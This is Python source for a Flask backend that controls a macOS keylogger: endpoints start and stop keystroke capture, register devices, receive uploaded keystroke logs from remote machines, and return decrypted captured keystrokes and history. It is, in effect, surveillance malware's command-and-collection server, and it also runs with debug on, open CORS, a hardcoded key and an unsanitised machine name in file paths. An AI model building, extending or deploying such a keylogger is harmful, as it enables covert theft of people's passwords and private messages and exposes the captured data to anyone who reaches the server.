from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from src.encryption.encryptor import Encryptor
from src.keylogger.mac_keylogger import MacKeyLogger
from src.writers.file_writer import FileWriter
from src.keylogger.manager import KeyLoggerManager
import time
import os
import uuid
from typing import Set

app = Flask(__name__, 
    template_folder='../web/templates',
    static_folder='../web/static'
)

# Update CORS configuration
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type"]
    }
})

# Constants
DATA_FOLDER = "logs"

# Initialize components
keylogger = MacKeyLogger()
writer = FileWriter(
    encryption_key="your_secret_key",
    base_path=os.path.join(os.path.dirname(__file__), 'data')
)
manager = KeyLoggerManager(keylogger, writer)

# Initialize active devices set
active_devices = set()
app.active_devices = active_devices

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_logging():
    try:
        data = request.get_json()
        selected_os = data.get('os', 'macos')  # Default to macos if not specified
        
        if selected_os == 'macos':
            if not hasattr(app, 'keylogger'):
                app.keylogger = MacKeyLogger()
                app.writer = FileWriter(encryption_key="your_secret_key")
                app.manager = KeyLoggerManager(app.keylogger, app.writer)
            
            app.manager.start()
            return jsonify({
                "status": "success", 
                "message": f"MacOS keylogger started"
            }), 200
            
        elif selected_os == 'windows':
            return jsonify({
                "status": "error",
                "message": "Windows keylogger not implemented yet"
            }), 501
            
        elif selected_os == 'linux':
            return jsonify({
                "status": "error",
                "message": "Linux keylogger not implemented yet"
            }), 501
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/stop', methods=['POST'])
def stop_logging():
    try:
        if hasattr(app, 'manager'):
            app.manager.stop()
            return jsonify({
                "status": "success",
                "message": "Keylogger stopped"
            }), 200
        return jsonify({
            "status": "error",
            "message": "No active keylogger"
        }), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/status', methods=['GET'])
def get_status():
    return jsonify({
        "status": "running" if hasattr(app, 'manager') and app.manager.running else "stopped",
        "os": "MacOS" if hasattr(app, 'keylogger') else "Unknown"
    }), 200

@app.route('/devices', methods=['GET'])
def get_devices():
    try:
        # Only return device if it's active
        if hasattr(app, 'device_id') and app.device_id in app.active_devices:
            current_device = {
                "id": app.device_id,
                "name": "Current Machine",
                "status": "active" if hasattr(app, 'manager') and app.manager.running else "inactive",
                "os": "MacOS",
                "lastActive": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            return jsonify({
                "status": "success",
                "devices": [current_device]
            }), 200
        return jsonify({"status": "success", "devices": []}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    try:
        if hasattr(app, 'device_id') and app.device_id == device_id:
            # Read the latest log file
            log_path = os.path.join('backend', 'data', f"keylog_{time.strftime('%Y-%m-%d')}.txt")
            if os.path.exists(log_path):
                with open(log_path, 'r') as f:
                    logs = f.read()
                return jsonify({"logs": logs}), 200
            return jsonify({"logs": "No logs available"}), 200
        return jsonify({"error": "Device not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/logs/decrypted/<device_id>', methods=['GET'])
def get_decrypted_logs(device_id):
    try:
        if hasattr(app, 'device_id') and app.device_id == device_id:
            log_path = os.path.join('backend', 'data', f"keylog_{time.strftime('%Y-%m-%d')}.txt")
            if os.path.exists(log_path):
                decrypted_logs = []
                with open(log_path, 'r') as f:
                    for line in f:
                        if line.startswith('ENC:'):
                            # Get the hex data after the marker
                            hex_data = line[4:].strip()
                            # Convert hex to bytes and decrypt
                            encrypted_data = bytes.fromhex(hex_data)
                            decrypted = writer.encryptor.decrypt(encrypted_data)
                            decrypted_logs.append(decrypted)
                        
                return jsonify({"logs": ''.join(decrypted_logs)}), 200
            return jsonify({"logs": "No logs available"}), 200
        return jsonify({"error": "Device not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def generate_log_file_name():
    return "Log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid request"}), 400
    
    machine = data["machine"]
    log_data = data["data"]
    
    # Creating a file for machine if it doesn't exist
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)
        
    # Creating new file based on current timestamp
    file_name = generate_log_file_name()
    file_path = os.path.join(machine_folder, file_name)
    
    # Writing data to the file
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)
        
    return jsonify({"message": "Data uploaded successfully"}), 200

@app.route('/history', methods=['GET'])
def get_history():
    try:
        history = []
        data_folder = os.path.join('backend', 'data')
        
        # Walk through all device folders
        for device_folder in os.listdir(data_folder):
            device_path = os.path.join(data_folder, device_folder)
            if os.path.isdir(device_path):
                # Get all log files for this device
                for log_file in os.listdir(device_path):
                    if log_file.startswith('keylog_'):
                        file_path = os.path.join(device_path, log_file)
                        # Get file creation time
                        timestamp = os.path.getctime(file_path)
                        
                        # Read and decrypt the content
                        with open(file_path, 'r') as f:
                            encrypted_content = f.read()
                            decrypted_content = ''
                            for line in encrypted_content.split('\n'):
                                if line.startswith('ENC:'):
                                    # Get the hex data after the marker
                                    hex_data = line[4:].strip()
                                    # Convert hex to bytes and decrypt
                                    encrypted_data = bytes.fromhex(hex_data)
                                    decrypted = writer.encryptor.decrypt(encrypted_data)
                                    decrypted_content += decrypted + '\n'
                                else:
                                    decrypted_content += line + '\n'
                        
                        history.append({
                            'deviceId': device_folder,
                            'timestamp': timestamp,
                            'date': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp)),
                            'content': decrypted_content.strip()
                        })
        
        # Sort by timestamp, newest first
        history.sort(key=lambda x: x['timestamp'], reverse=True)
        
        return jsonify({
            "status": "success",
            "history": history
        }), 200
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/deactivate', methods=['POST'])
def deactivate_device():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        
        if hasattr(app, 'device_id') and app.device_id == device_id:
            # Stop the keylogger if it's running
            if hasattr(app, 'manager') and app.manager.running:
                app.manager.stop()
            
            # Move logs to history
            current_log = os.path.join('backend', 'data', f"keylog_{time.strftime('%Y-%m-%d')}.txt")
            if os.path.exists(current_log):
                history_folder = os.path.join('backend', 'data', device_id)
                os.makedirs(history_folder, exist_ok=True)
                
                # Move file to history with timestamp
                history_file = os.path.join(
                    history_folder, 
                    f"keylog_{time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
                )
                os.rename(current_log, history_file)
            
            # Remove from active devices and clear device ID
            if device_id in app.active_devices:
                app.active_devices.remove(device_id)
            if hasattr(app, 'device_id'):
                delattr(app, 'device_id')
            
            return jsonify({
                "status": "success",
                "message": "Device deactivated and logs archived"
            }), 200
            
        return jsonify({
            "status": "error",
            "message": "Device not found"
        }), 404
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Add this to handle new connections
@app.route('/connect', methods=['POST'])
def connect_device():
    try:
        if not hasattr(app, 'device_id'):
            app.device_id = str(uuid.uuid4())
        app.active_devices.add(app.device_id)
        return jsonify({
            "status": "success",
            "deviceId": app.device_id
        }), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
    